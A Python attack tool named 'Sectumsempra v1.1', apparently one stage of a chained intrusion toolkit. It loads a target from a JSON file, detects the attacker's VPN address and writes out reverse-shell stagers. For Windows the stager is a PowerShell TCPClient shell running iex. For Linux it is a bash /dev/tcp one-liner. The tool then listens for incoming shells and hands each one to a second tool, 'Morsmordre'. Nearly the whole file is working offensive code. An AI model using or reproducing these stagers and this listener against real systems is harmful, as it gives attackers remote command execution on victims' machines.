#!/usr/bin/env python3
"""
Sectumsempra v1.1 - Green Engine
Async Socket Listener with Tool 3 Handoff
"""

import asyncio
import argparse
import json
import os
import socket
import sys
from pathlib import Path
from typing import Optional, Dict, Any
import subprocess

try:
    from rich.console import Console
    from rich.panel import Panel
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

class Sectumsempra:
    def __init__(self):
        self.console = Console() if RICH_AVAILABLE else None
        self.lhost: Optional[str] = None
        self.lport: int = 4444
        self.target_os: str = "Linux"
        self.target_ip: str = ""
        self.contract_file: Optional[str] = None
        
    def banner(self):
        if self.console:
            self.console.print(Panel.fit(
                "[bold green]Sectumsempra v1.1 - Green Engine[/bold green]",
                subtitle="[green]The Handoff Protocol[/green]",
                border_style="green"
            ))
        else:
            print("\033[92m>>> Sectumsempra v1.1 - Green Engine <<<\033[0m")
    
    def status(self, msg: str, level: str = "info"):
        indicators = {
            "info": "[*]", "success": "[+]", "warning": "[!]", 
            "error": "[-]", "handoff": "[»]"
        }
        ind = indicators.get(level, "[*]")
        
        if self.console:
            color = {"info": "blue", "success": "green", "warning": "yellow", 
                    "error": "red", "handoff": "magenta"}.get(level, "white")
            self.console.print(f"[{color}]{ind} {msg}[/{color}]")
        else:
            colors = {"info": "\033[94m", "success": "\033[92m", 
                     "warning": "\033[93m", "error": "\033[91m", "handoff": "\033[95m"}
            print(f"{colors.get(level, '')}{ind} {msg}\033[0m")
    
    def find_tun0(self) -> str:
        """Auto-detect VPN interface"""
        try:
            import netifaces
            if 'tun0' in netifaces.interfaces():
                addrs = netifaces.ifaddresses('tun0')
                if netifaces.AF_INET in addrs:
                    return addrs[netifaces.AF_INET][0]['addr']
        except:
            pass
        
        # Fallback to ip command
        try:
            result = subprocess.run(
                ["ip", "addr", "show", "tun0"], 
                capture_output=True, text=True
            )
            import re
            match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
            if match:
                return match.group(1)
        except:
            pass
        
        return "0.0.0.0"
    
    def load_contract(self, filename: Optional[str] = None) -> Dict:
        """Load NetWeave contract"""
        if filename:
            self.contract_file = filename
        else:
            # Auto-find latest
            files = sorted(Path('.').glob('netweave_*.json'))
            if not files:
                self.status("No contract found", "error")
                sys.exit(1)
            self.contract_file = str(files[-1])
        
        with open(self.contract_file) as f:
            data = json.load(f)
        
        self.target_ip = data.get('target', '')
        self.target_os = data.get('operating_system', 'Linux')
        self.status(f"Contract loaded: {self.contract_file}", "success")
        self.status(f"Target: {self.target_ip} | OS: {self.target_os}", "info")
        return data
    
    def generate_payload(self) -> str:
        """Generate OS-appropriate stager"""
        self.lhost = self.find_tun0()
        self.status(f"LHOST auto-detected: {self.lhost}", "success")
        
        if self.target_os == "Windows":
            # PowerShell reverse shell
            payload = f"""$client = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
            filename = f"payload_windows_{self.target_ip.replace('.', '_')}.ps1"
        else:
            # Linux bash reverse shell
            payload = f"""bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"""
            filename = f"payload_linux_{self.target_ip.replace('.', '_')}.sh"
        
        with open(filename, 'w') as f:
            f.write(payload)
        
        os.chmod(filename, 0o755)
        self.status(f"Payload generated: {filename}", "success")
        return filename
    
    async def handle_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Handle incoming shell - THE HANDOFF TO TOOL 3"""
        addr = writer.get_extra_info('peername')
        self.status(f"SHELL LANDED from {addr[0]}:{addr[1]}", "handoff")
        
        # Create socket descriptor for Tool 3
        sock = writer.get_extra_info('socket')
        
        # Launch Morsmordre (Tool 3) with the active socket
        # We pass the socket via environment variable or stdin
        env = os.environ.copy()
        env['MORSMORDRE_SOCK'] = str(sock.fileno())
        env['MORSMORDRE_TARGET'] = self.target_ip
        env['MORSMORDRE_OS'] = self.target_os
        
        self.status("Initiating handoff to Morsmordre...", "handoff")
        
        # Option 1: Exec Morsmordre inline (replaces this process)
        # os.execve('./morsmordre.py', ['morsmordre'], env)
        
        # Option 2: Async handoff - spawn Morsmordre and pipe the connection
        proc = await asyncio.create_subprocess_exec(
            sys.executable, 'morsmordre.py',
            stdin=reader,  # Pipe shell output to Tool 3
            stdout=writer,  # Pipe Tool 3 commands to shell
            env=env
        )
        
        await proc.wait()
        writer.close()
        await writer.wait_closed()
    
    async def start_listener(self):
        """Async socket server"""
        server = await asyncio.start_server(
            self.handle_connection, '0.0.0.0', self.lport
        )
        
        self.status(f"Listener bound: 0.0.0.0:{self.lport}", "success")
        self.status("Awaiting shell...", "info")
        
        async with server:
            await server.serve_forever()
    
    def run(self, contract_file: Optional[str] = None):
        self.banner()
        
        # Load context
        contract = self.load_contract(contract_file)
        
        # Generate stager
        self.generate_payload()
        
        # Start listener with handoff capability
        try:
            asyncio.run(self.start_listener())
        except KeyboardInterrupt:
            self.status("Listener terminated", "warning")

def main():
    parser = argparse.ArgumentParser(description='Sectumsempra v1.1 - The Handoff')
    parser.add_argument('--contract', help='NetWeave JSON contract')
    args = parser.parse_args()
    
    Sectumsempra().run(args.contract)

if __name__ == "__main__":
    main()
